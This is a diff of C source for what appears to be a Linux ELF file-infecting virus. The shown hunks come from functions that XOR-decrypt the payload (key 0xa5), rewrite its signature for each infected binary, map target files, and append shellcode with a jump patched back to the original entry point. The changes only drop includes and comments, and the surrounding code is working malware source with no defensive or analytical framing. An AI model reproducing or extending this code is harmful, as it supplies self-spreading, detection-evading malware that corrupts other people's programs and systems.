@@ -2,17 +2,14 @@
 static void  start(void) {}
 #define _FCNTL_H
 #define _SYS_MMAN_H
-#define _SIGNAL_H
 #include <linux/stat.h>
 #include <stddef.h>
 #include <sys/types.h>
 #include <bits/stat.h>
 #include <bits/fcntl.h>
 #include <bits/mman.h>
-#include <stdio.h>
 #include <dirent.h>
 #include <elf.h>
-#include <bits/signum-generic.h>
 
 /* Architecture dependent */
 enum __ptrace_request {
@@ -120,7 +117,6 @@ static int unObfuscate(void) {
     code[i] ^= 0xa5;
     i += 1;
   }
-  // TODO Update signature for each infected bin
   updateSignature();
   if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
     return (-1);
@@ -490,8 +486,6 @@ static void       dynamicSignature(void) {
       "nop");
 }
 
-#include <string.h>
-
 static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
   int         fd;
   size_t      len;
@@ -658,8 +652,6 @@ static int  appendShellcode(struct bfile *bin) {
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   copyModifiedCode(&new, bin->size, size);
-
-  /* memcpy(((void *)new.header) + bin->size, start, size); */
   address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 6;
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
@@ -671,7 +663,6 @@ static int  appendShellcode(struct bfile *bin) {
   ins[7] = (address >> 48) & 0xff;
   ins[8] = (address >> 56) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
-  /* modifyStructure(((void *)new.header) + bin->size, size); */
   obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   munmap(bin->header, bin->size);
   bin->header = new.header;
